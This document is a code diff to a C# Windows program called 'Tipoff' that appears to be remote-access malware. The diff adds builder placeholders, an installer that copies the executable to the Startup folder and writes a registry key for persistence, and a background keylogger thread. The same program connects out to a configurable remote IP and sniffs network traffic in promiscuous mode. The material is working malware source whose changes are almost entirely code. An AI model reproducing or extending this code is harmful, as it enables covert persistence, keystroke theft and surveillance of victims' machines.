@@ -18,22 +18,36 @@ using System.Net;
 using System.Threading;
 using System.Security.Principal;
 using System.Management;
+using System.Diagnostics;
 
 namespace Tipoff
 {
     public partial class Form1 : Form
     {
-        private string id_prefix = "Hacked_";
+        private string id_prefix = "[PREFIX]";
 
         private Socket m_Socket;
         private bool m_bConnected = false;
 
-        private int m_nTimeout = 10000; //ms
-        private int m_nRetry = 10000; //ms
+        private int m_nTimeout = int.Parse("[TIMEOUT]"); //ms
+        private int m_nRetry = int.Parse("[RETRY]"); //ms
 
+        //Install
+        private bool m_bCopyDir = bool.Parse("[IS_CP_DIR]");
+        private string m_szCopyDir = "[IS_SZ_DIR]"; //Dir name (path or path variable)
+        private bool m_bCopyStartUp = bool.Parse("[IS_CP_STARTUP]");
+        private string m_szCopyStartUp = "[IS_SZ_STARTUP]"; //Filename
+        private bool m_bReg = bool.Parse("[IS_REG]");
+        private string m_szRegKeyName = "[IS_REG_KEY]"; //Registry key name
+
+        //Misc
+        private string m_szKeylogFileName = "[KL_FILE]";
         private bool m_bKeylogger = bool.Parse("True");
 
-        private string m_szPassword = "8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92"; //"[SHA256_PASSWORD]";
+        private KeyLogger keylogger;
+        private Installer installer;
+
+        private string m_szPassword = "[SHA256_PASSWORD]";
 
         public Form1()
         {
@@ -282,7 +296,7 @@ namespace Tipoff
         {
             try
             {
-                Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+                Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, System.Net.Sockets.ProtocolType.Tcp);
                 sock.ReceiveTimeout = sock.SendTimeout = m_nTimeout;
                 sock.Connect(new IPEndPoint(IPAddress.Parse(szIPAddr), nPort));
 
@@ -339,7 +353,6 @@ namespace Tipoff
 
             Packet pkt = Packet.ParsePacket(pktRaw.LinkLayerType, pktRaw.Data);
             IpPacket pktIP = pkt.Extract(typeof(IpPacket)) as IpPacket;
-
             var pktTCP = pkt.Extract(typeof(TcpPacket)) as TcpPacket;
             var pktUDP = pkt.Extract(typeof(UdpPacket)) as UdpPacket;
             var pktICMP = pkt.Extract(typeof(ICMPv4Packet)) as ICMPv4Packet;
@@ -374,6 +387,19 @@ namespace Tipoff
                 return;
 
             m_bConnected = false;
+            installer = new Installer();
+            installer.m_szCurrentPath = Process.GetCurrentProcess().MainModule.FileName;
+            installer.m_bCopyDir = m_bCopyDir;
+            installer.m_szCopyPath = Environment.ExpandEnvironmentVariables(Path.Combine(m_szCopyDir, Path.GetFileName(installer.m_szCurrentPath)));
+            installer.m_bStartUp = m_bCopyStartUp;
+            installer.m_szStartUpName = Environment.ExpandEnvironmentVariables(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), m_szCopyStartUp));
+            installer.m_bReg = m_bReg;
+            installer.m_szRegKeyName = m_szRegKeyName;
+
+            installer.Start();
+
+            keylogger = new KeyLogger(m_szKeylogFileName);
+            new Thread(() => keylogger.Start()).Start();
 
             foreach (var device in devices)
             {
@@ -381,7 +407,7 @@ namespace Tipoff
                 {
                     device.Open(DeviceMode.Promiscuous, 1000);
                     device.OnPacketArrival += new PacketArrivalEventHandler(Device_OnPacketArrival);
-                    device.Filter = "udp && tcp && icmp";
+                    device.Filter = "udp || tcp || icmp";
                     device.StartCapture();
                 }
                 catch
